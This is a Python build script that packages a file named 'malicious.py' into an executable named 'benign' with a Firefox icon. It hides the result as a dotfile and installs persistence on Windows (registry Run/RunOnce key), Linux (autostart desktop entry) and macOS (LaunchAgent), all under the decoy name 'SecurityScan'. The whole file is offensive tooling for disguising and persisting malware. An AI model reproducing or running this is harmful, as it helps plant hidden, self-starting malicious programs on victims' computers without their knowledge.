import shutil
import os
import platform
import PyInstaller.__main__
import argparse

filename = "malicious.py"
exename = "benign.exe" if platform.system() == "Windows" else "benign"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd, "USB")

if os.path.isfile(exename):
    os.remove(exename)

# Function to build the binary on Windows
def build_binary_windows():
    # Create executable from Python script using PyInstaller
    PyInstaller.__main__.run([
        filename,
        "--onefile",
        "--clean",
        "--log-level=ERROR",
        "--name=" + exename,
        "--icon=" + icon
    ])

    # Clean up after PyInstaller
    shutil.move(os.path.join(pwd, "dist", exename), pwd)
    shutil.rmtree("dist")
    shutil.rmtree("build")
    if os.path.exists("__pycache__"):
        shutil.rmtree("__pycache__")
    os.remove(exename + ".spec")

# Function to build the binary on Linux
def build_binary_linux():
    # Create executable from Python script using PyInstaller as a binary file
    PyInstaller.__main__.run([
        filename,
        "--onefile",
        "--clean",
        "--log-level=ERROR",
        "--name=" + exename
    ])

    # Clean up after PyInstaller
    shutil.move(os.path.join(pwd, "dist", exename), pwd)
    shutil.rmtree("dist")
    shutil.rmtree("build")
    if os.path.exists("__pycache__"):
        shutil.rmtree("__pycache__")
    os.remove(exename + ".spec")

# Function to build the binary on macOS
def build_binary_macos():
    # Create executable from Python script using PyInstaller as a binary file
    PyInstaller.__main__.run([
        filename,
        "--onefile",
        "--clean",
        "--log-level=ERROR",
        "--name=" + exename
    ])

    # Clean up after PyInstaller
    shutil.move(os.path.join(pwd, "dist", exename), pwd)
    shutil.rmtree("dist")
    shutil.rmtree("build")
    if os.path.exists("__pycache__"):
        shutil.rmtree("__pycache__")
    os.remove(exename + ".spec")

# Function to set up autorun on Windows
def setup_autorun_windows(filepath):
    import winreg

    regkey = 1

    if regkey < 2:
        reghive = winreg.HKEY_CURRENT_USER
    else:
        reghive = winreg.HKEY_LOCAL_MACHINE
    if (regkey % 2) == 0:
        regpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    else:
        regpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"

    # Add registry autorun key
    reg = winreg.ConnectRegistry(None, reghive)
    key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
    winreg.SetValueEx(key, "SecurityScan", 0, winreg.REG_SZ, filepath)

# Function to set up autorun on Linux
def setup_autorun_linux(filepath):
    home_dir = os.path.expanduser("~")
    autostart_dir = os.path.join(home_dir, ".config", "autostart")
    desktop_file = os.path.join(autostart_dir, "securityscan.desktop")

    # Create a desktop file
    with open(desktop_file, "w") as file:
        file.write("[Desktop Entry]\n")
        file.write("Type=Application\n")
        file.write("Exec=" + filepath + "\n")
        file.write("Hidden=false\n")
        file.write("NoDisplay=false\n")
        file.write("X-GNOME-Autostart-enabled=true\n")
        file.write("Name[en_US]=SecurityScan\n")

# Function to set up autorun on macOS
def setup_autorun_macos(filepath):
    home_dir = os.path.expanduser("~")
    launch_agents_dir = os.path.join(home_dir, "Library", "LaunchAgents")
    plist_file = os.path.join(launch_agents_dir, "securityscan.plist")

    # Create a plist file with the absolute path of the binary file
    with open(plist_file, "w") as file:
        file.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
        file.write("<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n")
        file.write("<plist version=\"1.0\">\n")
        file.write("<dict>\n")
        file.write("    <key>Label</key>\n")
        file.write("    <string>com.securityscan</string>\n")
        file.write("    <key>ProgramArguments</key>\n")
        file.write("    <array>\n")
        file.write("        <string>" + os.path.abspath(filepath) + "</string>\n")
        file.write("    </array>\n")
        file.write("    <key>RunAtLoad</key>\n")
        file.write("    <true/>\n")
        file.write("</dict>\n")
        file.write("</plist>\n")

# Function to run the script
def run_script(target_os, desired_directory):
    # Build the binary based on the target operating system
    if target_os == "windows":
        build_binary_windows()
    elif target_os == "linux":
        build_binary_linux()
    elif target_os == "macos":
        build_binary_macos()
    else:
        print("Unsupported operating system.")
        return

    # Move the built files to the desired directory and make them hidden
    filedir = os.path.join(pwd, "Temp")
    filepath = os.path.join(filedir, exename)
    if os.path.isfile(filepath):
        shutil.move(filepath, os.path.join(desired_directory, "." + exename))

    # Set up autorun based on the target operating system
    if target_os == "windows":
        setup_autorun_windows(os.path.join(desired_directory, "." + exename))
    elif target_os == "linux":
        setup_autorun_linux(os.path.join(desired_directory, "." + exename))
    elif target_os == "macos":
        setup_autorun_macos(os.path.join(desired_directory, "." + exename))
    else:
        print("Unsupported operating system.")
        return

    # Print a success message
    print("Executable built and autorun set up successfully for", target_os)

# Parse command line arguments
parser = argparse.ArgumentParser(description="Script to build binary and set up autorun")
parser.add_argument("target_os", choices=["windows", "linux", "macos"], help="Target operating system")
parser.add_argument("desired_directory", help="Desired directory to move the built files")
args = parser.parse_args()

# Run the script
run_script(args.target_os, args.desired_directory)
